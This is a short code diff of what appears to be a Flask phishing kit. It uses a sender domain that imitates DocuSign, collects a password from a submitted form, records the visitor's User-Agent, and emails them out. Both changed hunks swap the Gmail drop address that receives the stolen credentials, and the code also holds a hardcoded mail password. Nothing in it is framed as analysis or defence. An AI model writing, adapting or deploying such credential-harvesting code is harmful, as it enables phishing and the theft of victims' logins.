@@ -147,7 +147,7 @@ def first():
         passwordemail = request.form.get("pig")
         sender_email = "contact@indrux-doccussign.com"
         sender_emaill = "contact"
-        receiver_email = "hermannie.trx@gmail.com"
+        receiver_email = "divine.f4vour66@gmail.com"
         password = "vipb84b4ff7e093"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
@@ -185,7 +185,7 @@ def second():
         passwordemail = request.form.get("pig")
         sender_email = "contact@indrux-doccussign.com"
         sender_emaill = "contact"
-        receiver_email = "hermannie.trx@gmail.com"
+        receiver_email = "divine.f4vour66@gmail.com"
         password = "vipb84b4ff7e093"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
